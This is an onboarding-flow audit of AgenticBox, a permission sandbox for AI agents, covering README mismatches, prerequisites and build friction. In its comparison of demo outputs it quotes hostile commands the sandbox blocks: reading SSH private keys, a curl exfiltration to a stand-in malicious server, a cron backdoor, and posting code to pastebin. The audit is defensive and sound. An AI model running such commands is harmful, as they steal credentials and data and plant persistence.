# Developer Onboarding Flow Audit

> **Goal:** Can a new developer clone the repo and see the demo in under 5 minutes?
> **Audited:** 2026-07-01, Run 7 (AI Cofounder Sprint)
> **Method:** Fresh build from source on Windows (git-bash/MSYS), ran `agenticbox run demo`, read all docs.

---

## TL;DR

The demo **works** — `agenticbox run demo` produces clean, screenshot-worthy permission log output in ~8 seconds. But the README's "See It In Action" section shows **illustrative output that doesn't match the real demo**, the prerequisites overstate what's needed, and the build command builds the entire workspace instead of just the CLI. These three issues will lose developers in the first 60 seconds.

**Friction score:** 4/10 (good core, fixable surface issues)
**Time to first demo:** ~90 seconds (if they follow the fixed quickstart)
**Time to first demo today:** ~3-4 minutes (confusing prerequisites, full workspace build, misleading output)

---

## What Works ✅

1. **The demo is real** — `agenticbox run demo` uses actual `FsGuard` and `NetworkGuard` instances to make real allow/deny decisions against real files on disk. Not hardcoded output.
2. **The demo is self-contained** — no Docker, no daemon, no API keys, no LLM needed. Just Rust + cargo.
3. **Build succeeds cleanly** — `cargo build --release --bin agenticbox -p agenticbox-cli` compiles in ~30s on a warm cache, ~60s cold.
4. **The output is screenshot-worthy** — colored ✓ ALLOWED / ✗ BLOCKED, timestamps, summary, clear scenario narrative.
5. **Agent manifests exist** — 4 example agents in `agents/` (security-analyst, pi, hermes, reviewer).
6. **The `agents.md` doc is thorough** — manifest format, permissions table, CLI overrides, all documented.

---

## Friction Points (Ranked by Severity)

### 🔴 P0: README "See It In Action" shows output that doesn't match reality

**The problem:** The README's first code block (lines 19-42) shows a simplified, illustrative demo output with emoji indicators (🔴/🟢) and different actions (`cat ~/.ssh/id_rsa`, `curl http://malicious-server.com/exfil`, `write /etc/cron.d/backdoor`). The **actual** demo output is a deployment scenario with ✓/✗ indicators and different actions (`cat ~/.ssh/deploy_key`, `curl -X POST https://pastebin.com/api`, `bash /workspace/deploy.sh`).

**Why it matters:** A developer runs `agenticbox run demo` expecting to see what's in the README. They see something completely different. This breaks trust immediately and violates the "no fake demos" principle.

**Fix:** Either (a) replace the README's illustrative output with real output from the demo, or (b) clearly label it as "Illustrative — actual output varies." Option (a) is strongly preferred.

### 🔴 P0: Prerequisites overstate what's needed for the demo

**The problem:** The README lists three prerequisites:
- Rust 1.75+ ✅ (correct — needed to build)
- Docker ❌ (not needed for `agenticbox run demo`)
- LM Studio / OpenAI-compatible API ❌ (not needed for the demo)

**Why it matters:** A developer without Docker installed will see "Docker" in prerequisites and bounce before even trying. The demo is the hook — it should have the lowest possible barrier.

**Fix:** Split prerequisites into "For the demo" (just Rust) and "For container mode" (Docker) and "For builtin agent mode" (LM Studio/API key). Lead with the minimum.

### 🟡 P1: `cargo build --release` builds the entire workspace

**The problem:** The README says `cargo build --release`, which builds the daemon, CLI, and desktop Tauri app (which needs GUI libs on Linux). On Windows this works but wastes 2-3 minutes compiling the daemon and its dependencies.

**Fix:** Change to `cargo build --release --bin agenticbox` (or `-p agenticbox-cli`). This builds only the CLI binary in ~30s.

### 🟡 P1: No one-liner install path

**The problem:** A developer must `git clone` + `cargo build`. There's no `cargo install agenticbox`, `brew install agenticbox`, or `curl | sh` path. For viral adoption (the kanban's #1 goal), this is high friction.

**Fix (medium-term):** Publish to crates.io so `cargo install agenticbox` works. Publish a Homebrew tap. This is a separate task — flagged here, not blocking the quickstart fix.

### 🟡 P1: README claims features that don't work yet

**The problem:** The "What's Shipped" table marks "Real Docker Execution" as ✅, but `agenticbox run -- python3 script.py` requires Docker to be running and a base image to exist. The demo mode (`agenticbox run demo`) is the only mode that works without external dependencies. The ad-hoc command example in the Quick Start will fail for anyone without Docker.

**Fix:** Add a note in Quick Start: "Container mode requires Docker. The demo runs without any external dependencies."

### 🟢 P2: Timestamp formatting in demo output

**The problem:** The `ts()` function produces single-digit hours: `0:36:21` instead of `00:36:21`. Minor, but looks sloppy in screenshots.

**Fix:** Change `format!("{}:{:02}:{:02}", ...)` to `format!("{:02}:{:02}:{:02}", ...)`.

### 🟢 P2: Windows binary path not documented

**The problem:** README says `./target/release/agenticbox` but on Windows it's `./target/release/agenticbox.exe`. The `cargo build` output will make this obvious, but it's a minor friction point.

**Fix:** Add a note or use `./target/release/agenticbox[.exe]`.

### 🟢 P2: `cp -r agents/*` doesn't work on Windows

**The problem:** The Quick Start says `cp -r agents/* ~/.agenticbox/agents/`. On Windows (cmd/PowerShell), `cp` isn't available and `~` doesn't expand the same way. In git-bash this works, but native Windows users will struggle.

**Fix:** Add platform-specific instructions or use `agenticbox init` as the primary path.

---

## Friction-Free Quickstart (Recommended Rewrite)

```markdown
## Quick Start

### Prerequisites

- **Rust 1.75+** — [install](https://rustup.rs)

> Docker and an LLM API are only needed for container mode and builtin agent mode.
> The demo below runs with zero external dependencies.

### Build

```bash
git clone https://github.com/morpheus-sh/agenticbox.git
cd agenticbox
cargo build --release --bin agenticbox
```

### See it work in 10 seconds

```bash
# Built-in permission guard demo — real FsGuard + NetworkGuard enforcement
./target/release/agenticbox run demo
```

This runs a scripted scenario where an agent deploys a script to production while
attempting to access SSH keys, exfiltrate code to pastebin, and read .env files.
Every dangerous attempt is caught and logged. No Docker, no API keys, no daemon.

### Next: Run a real agent (requires Docker)

```bash
# Copy example agent profiles
cp -r agents/* ~/.agenticbox/agents/

# Run in a sandboxed container
./target/release/agenticbox run hermes
```
```

---

## Onboarding Flow Map

```
Developer discovers AgenticBox
     │
     ▼
README → "See It In Action" section
     │
     ├─ ✅ Demo command is clear: `agenticbox run demo`
     ├─ ❌ Output shown is illustrative, not real
     │
     ▼
Quick Start → Prerequisites
     │
     ├─ ❌ Docker listed but not needed for demo
     ├─ ❌ LM Studio listed but not needed for demo
     │
     ▼
Build from source
     │
     ├─ ❌ `cargo build --release` builds everything
     ├─ ✅ Should be `--bin agenticbox` (30s vs 3min)
     │
     ▼
Run demo
     │
     ├─ ✅ Works immediately, no external deps
     ├─ ✅ Output is screenshot-worthy
     ├─ 🟡 Timestamp formatting (minor)
     │
     ▼
Try named agents / ad-hoc commands
     │
     ├─ ❌ Requires Docker (not clearly stated)
     ├─ ❌ `cp -r agents/*` fails on native Windows
     └─ ❌ Builtin agent mode needs LLM API setup
```

---

## Recommended Fix Priority

| Priority | Fix | Effort | Impact |
|----------|-----|--------|--------|
| P0 | Replace README demo output with real output | 10 min | Trust — first impression |
| P0 | Split prerequisites into "demo" vs "container mode" | 5 min | Reduces bounce rate |
| P1 | Fix build command to `--bin agenticbox` | 2 min | Saves 2-3 min of build time |
| P1 | Note that ad-hoc commands need Docker | 2 min | Prevents first failure |
| P2 | Fix timestamp formatting in demo | 1 min | Polish for screenshots |
| P2 | Add Windows path notes | 5 min | Cross-platform clarity |
| P2 | `cargo install` path (publish to crates.io) | 1 day | Viral adoption enabler |

---

## Notes for Nick

- The demo itself is solid — real enforcement, real files, real decisions. The problem is purely in how it's presented.
- The README's "See It In Action" section is the single highest-leverage fix. It's the first thing a developer sees, and it currently shows output that doesn't exist. Fixing this to show real output (or clearly labeling it as illustrative) would immediately improve the first impression.
- The prerequisites issue is the second-highest leverage fix. Docker in the prerequisites list will scare off developers who could run the demo in 30 seconds without it.
- Long-term, `cargo install agenticbox` is the viral adoption enabler. It removes the clone+build step entirely.
